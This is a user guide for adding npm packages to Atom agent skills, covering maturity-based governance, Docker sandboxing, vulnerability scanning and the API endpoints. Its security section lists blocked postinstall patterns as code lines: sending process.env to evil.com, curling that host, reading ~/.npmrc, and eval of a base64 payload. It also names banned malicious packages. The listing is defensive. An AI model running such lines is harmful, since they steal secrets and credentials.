# npm Packages in Skills - User Guide

> **Add lodash, express, axios, and other npm packages to your skills with automatic installation, security scanning, and isolated execution**

**Last Updated:** February 19, 2026

---

## Table of Contents

1. [Overview](#overview)
2. [Quick Start](#quick-start)
3. [Package Version Format](#package-version-format)
4. [Governance Rules](#governance-rules)
5. [Security Features](#security-features)
6. [Installation Workflow](#installation-workflow)
7. [API Usage](#api-usage)
8. [Troubleshooting](#troubleshooting)
9. [Best Practices](#best-practices)
10. [Examples](#examples)
11. [See Also](#see-also)

---

## Overview

Atom skills can now specify Node.js/npm packages (e.g., lodash, express, axios) in their SKILL.md files, with automatic installation in isolated Docker containers, permission checks, and security scanning.

**Key Features:**

- **Per-Skill Isolation** - Each skill gets its own Docker image with dedicated node_modules (no conflicts)
- **Vulnerability Scanning** - Automatic CVE detection before installation using npm audit + Snyk
- **Governance Integration** - Maturity-based access control (STUDENT blocked, INTERN requires approval)
- **Container Security** - Network disabled, read-only filesystem, resource limits
- **Postinstall Script Blocking** - Automatic --ignore-scripts flag prevents Shai-Hulud/Sha1-Hulud attacks
- **Audit Trail** - All package operations logged for compliance

**Performance:**

- Installation: <5min for typical packages (lodash, express)
- Permission checks: <1ms via GovernanceCache
- Execution overhead: <500ms

**Why npm Support?**

The npm ecosystem has 2M+ packages, matching OpenClaw's capabilities for Node.js skills. Atom's npm package support provides the same security and governance as Python packages, with npm-specific threat mitigation (postinstall scripts, typosquatting, dependency confusion).

---

## Quick Start

### Adding npm Packages to Your Skill

1. **Edit your SKILL.md file:**

```yaml
---
name: "Data Processing Skill"
description: "Process data using Lodash"
skill_type: nodejs_code
node_packages:
  - lodash@4.17.21
  - axios@^1.6.0
package_manager: npm  # Optional: npm (default), yarn, or pnpm
---

const _ = require('lodash');
const axios = require('axios');

async function process(query) {
    const data = _.map(query.split(','), Number);
    return _.sum(data);
}

process(inputs.query || '1,2,3,4,5');
```

2. **Import and use your skill:**

```python
from core.skill_adapter import CommunitySkillTool

tool = CommunitySkillTool(
    name="Data Processing",
    skill_type="nodejs_code",
    code="const _ = require('lodash'); _.sum([1,2,3]);",
    node_packages=["lodash@4.17.21", "axios@^1.6.0"]
)

result = tool._run(query="1,2,3,4,5")
```

3. **Atom automatically:**
   - Checks agent permissions for each package
   - Scans for postinstall scripts (blocks malicious patterns)
   - Runs vulnerability scanning (npm audit + Snyk)
   - Builds dedicated Docker image with node_modules
   - Executes skill in isolated container
   - Cleans up unused images

### Complete Workflow Example

```bash
# 1. Check npm package permission
curl -X GET "http://localhost:8000/api/packages/npm/check?agent_id=agent_789&package_name=lodash&version=4.17.21"

# Response: {"allowed": true, "maturity_required": "intern", "reason": null}

# 2. Install npm packages for skill
curl -X POST http://localhost:8000/api/packages/npm/install \
  -H "Content-Type: application/json" \
  -d '{
    "agent_id": "agent_789",
    "skill_id": "data-analysis-skill",
    "packages": ["lodash@4.17.21", "axios@^1.6.0"],
    "package_manager": "npm"
  }'

# Response: {"success": true, "image_tag": "atom-npm-skill:data-analysis-skill-v1"}

# 3. Execute skill with packages
curl -X POST http://localhost:8000/api/packages/npm/execute \
  -H "Content-Type: application/json" \
  -d '{
    "agent_id": "agent_789",
    "skill_id": "data-analysis-skill",
    "code": "const _ = require(\"lodash\"); _.sum([1,2,3]);",
    "inputs": {}
  }'

# Response: {"success": true, "output": "6", "execution_time_ms": 234}
```

---

## Package Version Format

npm packages use semantic versioning with flexible range specifiers:

### Version Formats

| Format | Example | Description | Recommended |
|--------|---------|-------------|-------------|
| **Exact** | `lodash@4.17.21` | Exact version only | ✅ Yes (production) |
| **Caret** | `axios@^1.6.0` | Compatible with 1.6.0+ (minor/patch updates) | ⚠️ Testing only |
| **Tilde** | `express@~4.18.0` | Patch updates only (4.18.x) | ⚠️ Testing only |
| **Greater** | `moment@>=2.29.0` | Minimum version | ❌ Avoid |
| **Wildcard** | `chalk@*` | Latest version | ❌ Avoid (security risk) |
| **Latest** | `lodash@latest` | Always latest | ❌ Avoid (security risk) |

### Scoped Packages

```yaml
node_packages:
  - @babel/core@7.23.0
  - @types/node@^20.0.0
  - @typescript-eslint/parser@^6.0.0
```

### Package Manager Selection

```yaml
# npm (default)
package_manager: npm

# yarn (faster installs, PnP mode)
package_manager: yarn

# pnpm (strict dependency isolation, highest security)
package_manager: pnpm
```

**Recommendation:** Use exact versions (e.g., `lodash@4.17.21`) for production skills to ensure reproducible builds and prevent supply chain attacks.

---

## Governance Rules

### Maturity-Based Access Control

| Agent Level | npm Packages | Justification |
|-------------|--------------|---------------|
| **STUDENT** | ❌ Blocked | Educational restriction - learn fundamentals first |
| **INTERN** | ⚠️ Approval Required | Human review for each package version |
| **SUPERVISED** | ✅ Conditional | Real-time monitoring, auto-approved packages only |
| **AUTONOMOUS** | ✅ Conditional | Full execution, respects banned package list |

### Permission Check Flow

```
1. Check GovernanceCache (<1ms lookup)
   └─ Cache HIT: Return cached decision
   └─ Cache MISS: Query database

2. Check PackageRegistry table
   └─ Package status: banned → BLOCK for all agents
   └─ Package status: active → Check maturity requirements
   └─ Package status: untrusted → Require approval

3. Check agent maturity
   └─ STUDENT → BLOCK (npm packages restricted)
   └─ INTERN → Require approval
   └─ SUPERVISED/AUTONOMOUS → Allow if min_maturity satisfied

4. Cache decision (60-second TTL)
```

### Cache Performance

- **Hit Rate:** >95% for repeated checks
- **Latency:** <1ms P99 (cached), <50ms P99 (database)
- **Throughput:** 600k+ ops/sec

### Whitelist/Blocklist

**Approved Packages (examples):**
- `lodash@4.17.21` - min_maturity: INTERN
- `axios@1.6.0` - min_maturity: INTERN
- `express@4.18.2` - min_maturity: SUPERVISED

**Banned Packages (examples):**
- `exprss@*` - Typosquatting attack package
- `crossenv@*` - Malicious postinstall scripts (CVE-2021-23362)
- `babelcli@*` - Known malicious package

---

## Security Features

### Postinstall Script Blocking

**Threat:** Shai-Hulud/Sha1-Hulud attacks (Sept/Nov 2025) - 700+ npm packages infected with postinstall credential stealers, 25K+ repositories affected.

**Mitigation:**
- All npm installs use `--ignore-scripts` flag
- Pre-installation script analysis detects malicious patterns
- Suspicious packages blocked before installation

**Protected Against:**
```javascript
// These patterns are detected and BLOCKED:
- fetch('https://evil.com/steal?data=' + JSON.stringify(process.env))
- require('child_process').exec('curl https://evil.com')
- fs.readFile('~/.npmrc', 'utf8')  // Credential theft
- eval(Buffer.from('...', 'base64').toString())  // Obfuscated payload
```

### Vulnerability Scanning

**npm audit** (free, built-in):
- Checks npm Advisory Database
- Scans transitive dependencies
- Returns CVE details with severity levels

**Snyk** (commercial, optional):
- Commercial vulnerability database
- Fix recommendations
- License compliance checking

**Scan Results:**
```json
{
  "safe": false,
  "vulnerabilities": [
    {
      "cve_id": "CVE-2021-23437",
      "severity": "HIGH",
      "package": "lodash",
      "affected_versions": "<4.17.21",
      "advisory": "Prototype Pollution attack",
      "source": "npm-audit"
    }
  ],
  "dependency_tree": {
    "lodash": "4.17.20",
    "lodash/node_modules": {}
  }
}
```

### Container Security

**Docker Security Constraints:**
- ✅ `network_disabled=True` - No outbound/inbound network
- ✅ `read_only=True` - No filesystem modifications
- ✅ `mem_limit=256m` - Memory cap (resource exhaustion prevention)
- ✅ `cpu_quota=0.5` - CPU limit (50% of one core)
- ✅ `timeout=30s` - Execution timeout (infinite loop prevention)
- ✅ `auto_remove=True` - Ephemeral containers
- ✅ `USER nodejs (UID 1001)` - Non-root user
- ✅ `--cap-drop=ALL` - No Linux capabilities

**Protected Against:**
- Container escape (Docker socket access, privileged mode)
- Resource exhaustion (fork bombs, memory bombs)
- Data exfiltration (network access blocked)
- Malware persistence (read-only filesystem)

---

## Installation Workflow

### Step-by-Step Process

**1. Permission Check**
```python
# <1ms via GovernanceCache
governance.check_npm_package_permission(
    agent_id="agent_789",
    package_name="lodash",
    version="4.17.21",
    db=session
)
# Returns: {"allowed": true, "maturity_required": "intern", "reason": None}
```

**2. Script Analysis**
```python
# Pre-installation check for malicious postinstall scripts
analyzer = NpmScriptAnalyzer()
result = analyzer.analyze_package_scripts(
    packages=["lodash@4.17.21"],
    package_manager="npm"
)
# Returns: {"malicious": false, "warnings": [], "scripts_found": []}
```

**3. Vulnerability Scan**
```python
# npm audit + Snyk scan
scanner = NpmDependencyScanner(snyk_api_key=os.getenv("SNYK_API_KEY"))
result = scanner.scan_packages(
    packages=["lodash@4.17.21"],
    package_manager="npm"
)
# Returns: {"safe": true, "vulnerabilities": [], "dependency_tree": {...}}
```

**4. Docker Image Build**
```python
# Install packages in dedicated image
installer = NpmPackageInstaller()
result = installer.install_packages(
    skill_id="data-analysis-skill",
    packages=["lodash@4.17.21", "axios@^1.6.0"],
    package_manager="npm"
)
# Returns: {"success": true, "image_tag": "atom-npm-skill:data-analysis-skill-v1"}
```

**5. Skill Execution**
```python
# Execute in isolated container
sandbox = HazardSandbox()
output = sandbox.execute_nodejs(
    code="const _ = require('lodash'); _.sum([1,2,3]);",
    inputs={},
    image="atom-npm-skill:data-analysis-skill-v1"
)
# Returns: "6"
```

### Docker Image Management

**Image Tag Format:**
```
atom-npm-skill:{skill_id}-v{version}
```

**Example:**
```
atom-npm-skill:data-analysis-skill-v1
atom-npm-skill:http-request-skill-v2
```

**Image Cleanup:**
```bash
# List skill images
docker images | grep atom-npm-skill

# Remove old images (periodic maintenance)
docker image prune -a --filter "until=72h"
```

---

## API Usage

### Governance Endpoints

**Check Package Permission**
```bash
GET /api/packages/npm/check?agent_id={agent_id}&package_name={name}&version={version}
```

**Response:**
```json
{
  "allowed": true,
  "maturity_required": "intern",
  "reason": null
}
```

**Request Package Approval**
```bash
POST /api/packages/npm/request
Content-Type: application/json

{
  "agent_id": "agent_789",
  "package_name": "express",
  "version": "4.18.2",
  "justification": "Need for HTTP server skill"
}
```

**Approve Package (Admin)**
```bash
POST /api/packages/npm/approve
Content-Type: application/json

{
  "package_name": "express",
  "version": "4.18.2",
  "min_maturity": "supervised"
}
```

**Ban Package (Admin)**
```bash
POST /api/packages/npm/ban
Content-Type: application/json

{
  "package_name": "crossenv",
  "version": "*",
  "reason": "Known malicious postinstall scripts (CVE-2021-23362)"
}
```

### Installation Endpoints

**Install Packages**
```bash
POST /api/packages/npm/install
Content-Type: application/json

{
  "agent_id": "agent_789",
  "skill_id": "data-analysis-skill",
  "packages": ["lodash@4.17.21", "axios@^1.6.0"],
  "package_manager": "npm"
}
```

**Execute Skill with Packages**
```bash
POST /api/packages/npm/execute
Content-Type: application/json

{
  "agent_id": "agent_789",
  "skill_id": "data-analysis-skill",
  "code": "const _ = require('lodash'); _.sum([1,2,3]);",
  "inputs": {}
}
```

**Cleanup Skill Image**
```bash
DELETE /api/packages/npm/{skill_id}
```

**Get Skill Image Status**
```bash
GET /api/packages/npm/{skill_id}/status
```

**Audit Trail**
```bash
GET /api/packages/npm/audit?agent_id={agent_id}&skill_id={skill_id}
```

---

## Troubleshooting

### Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `Permission denied` | STUDENT agent attempting npm package use | Use INTERN+ maturity agent |
| `Package not approved` | Package not in PackageRegistry | Submit approval request |
| `Package is banned` | Package has security vulnerability | Use alternative package |
| `Malicious scripts detected` | Postinstall/preinstall scripts contain malicious patterns | Review package, use --ignore-scripts |
| `Vulnerabilities found` | npm audit detected CVEs | Update package version |
| `Installation timeout` | Large dependency tree or network issues | Increase timeout, check network |
| `Image build failed` | Invalid package or version | Verify package name and version |

### Debug Tips

**Check Governance Status:**
```bash
curl -X GET "http://localhost:8000/api/packages/npm/check?agent_id=agent_789&package_name=lodash&version=4.17.21"
```

**View Audit Logs:**
```bash
curl -X GET "http://localhost:8000/api/packages/npm/audit?agent_id=agent_789"
```

**Check Docker Images:**
```bash
docker images | grep atom-npm-skill
docker logs <container_id>
```

**Enable Debug Logging:**
```python
import logging
logging.getLogger("core.npm_package_installer").setLevel(logging.DEBUG)
```

### Finding Logs

**Application Logs:**
- Location: `logs/atom.log`
- npm installer: `grep "NpmPackageInstaller" logs/atom.log`
- Script analyzer: `grep "NpmScriptAnalyzer" logs/atom.log`

**Docker Logs:**
```bash
# View container logs
docker logs atom-npm-skill-<container_id>

# Follow logs in real-time
docker logs -f atom-npm-skill-<container_id>
```

---

## Best Practices

### 1. Version Pinning

**✅ DO: Use exact versions**
```yaml
node_packages:
  - lodash@4.17.21
  - axios@1.6.0
```

**❌ DON'T: Use wildcards**
```yaml
node_packages:
  - lodash@latest  # Unpredictable updates
  - axios@*        # Security risk
```

### 2. Package Selection

**✅ DO: Use popular, well-maintained packages**
```yaml
node_packages:
  - lodash@4.17.21      # 39M weekly downloads
  - axios@1.6.0         # 33M weekly downloads
  - express@4.18.2      # 22M weekly downloads
```

**❌ DON'T: Use obscure packages**
```yaml
node_packages:
  - unknown-package@1.0.0  # <100 downloads, suspicious
  - exprss@4.17.1          # Typosquatting (misspelled)
```

### 3. Security Scanning

**Always enable vulnerability scanning:**
```python
result = installer.install_packages(
    skill_id="my-skill",
    packages=["lodash@4.17.21"],
    scan_for_vulnerabilities=True  # ✅ Always true
)
```

**Configure Snyk for enhanced scanning:**
```bash
# .env
SNYK_API_KEY=your-snyk-api-key
```

### 4. Package Manager Choice

| Manager | Use When | Benefits |
|---------|----------|----------|
| **npm** | Default, broad compatibility | Most common, stable |
| **yarn** | Monorepos, PnP mode needed | Faster installs, strict resolution |
| **pnpm** | High security required | Strictest isolation, prevents phantom deps |

### 5. Minimize Dependencies

**✅ DO: Use minimal packages**
```yaml
node_packages:
  - axios@1.6.0  # 3 dependencies
```

**❌ DON'T: Use heavy frameworks**
```yaml
node_packages:
  - mongoose@8.0.0  # 25+ dependencies
```

---

## Examples

### Example 1: Data Processing with Lodash

**SKILL.md:**
```yaml
---
name: "Array Statistics"
description: "Calculate statistics on arrays using Lodash"
skill_type: nodejs_code
node_packages:
  - lodash@4.17.21
---

const _ = require('lodash');

const data = inputs.data || [1, 2, 3, 4, 5];

return {
  sum: _.sum(data),
  mean: _.mean(data),
  min: _.min(data),
  max: _.max(data),
  sorted: _.sortBy(data)
};
```

**Usage:**
```python
tool = CommunitySkillTool(
    name="Array Statistics",
    skill_type="nodejs_code",
    code=code,  # From SKILL.md above
    node_packages=["lodash@4.17.21"]
)

result = tool._run(inputs={"data": [10, 20, 30, 40, 50]})
# Returns: {"sum": 150, "mean": 30, "min": 10, "max": 50, "sorted": [10,20,30,40,50]}
```

### Example 2: HTTP Requests with Axios

**SKILL.md:**
```yaml
---
name: "HTTP Fetch"
description: "Fetch data from URLs using Axios"
skill_type: nodejs_code
node_packages:
  - axios@1.6.0
---

const axios = require('axios');

const url = inputs.url || 'https://api.github.com/users/github';

try {
  const response = await axios.get(url, {
    timeout: 5000,
    headers: {'User-Agent': 'Atom-Skill/1.0'}
  });

  return {
    status: response.status,
    data: response.data
  };
} catch (error) {
  return {
    error: error.message,
    status: error.response?.status
  };
}
```

### Example 3: Web Server with Express

**SKILL.md:**
```yaml
---
name: "Express Server"
description: "Start HTTP server with Express"
skill_type: nodejs_code
node_packages:
  - express@4.18.2
---

const express = require('express');
const app = express();

const port = inputs.port || 3000;

app.get('/', (req, res) => {
  res.json({message: 'Hello from Atom!'});
});

// Note: Server startup will be blocked by network isolation
// This example demonstrates package loading, not actual server execution

return {
  message: 'Express server configured',
  port: port,
  routes: ['GET /']
};
```

### Example 4: Data Validation with Joi

**SKILL.md:**
```yaml
---
name: "Schema Validation"
description: "Validate data using Joi schema"
skill_type: nodejs_code
node_packages:
  - joi@17.11.0
---

const Joi = require('joi');

const schema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email({ minDomainSegments: 2 }).required(),
  age: Joi.number().integer().min(18).max(99)
});

const data = inputs.data || {};

const { error, value } = schema.validate(data);

if (error) {
  return { valid: false, error: error.details[0].message };
}

return { valid: true, data: value };
```

---

## See Also

- [SKILL Format Documentation](docs/SKILL_FORMAT.md) - Creating skills with npm dependencies
- [Python Package Support](docs/PYTHON_PACKAGES.md) - Python package governance and installation
- [Community Skills](docs/COMMUNITY_SKILLS.md) - Importing and using community skills
- [Package Security](docs/PACKAGE_SECURITY.md) - Security best practices for packages
- [npm Security Test Documentation](backend/tests/README_NPM_TESTS.md) - Security test scenarios

**Phase 36 Status:** ✅ **COMPLETE** (February 19, 2026)
- All 7 plans executed successfully
- npm package support matches OpenClaw capabilities
- Comprehensive security testing (40 tests, 100% pass rate)
- Full governance integration with Python packages
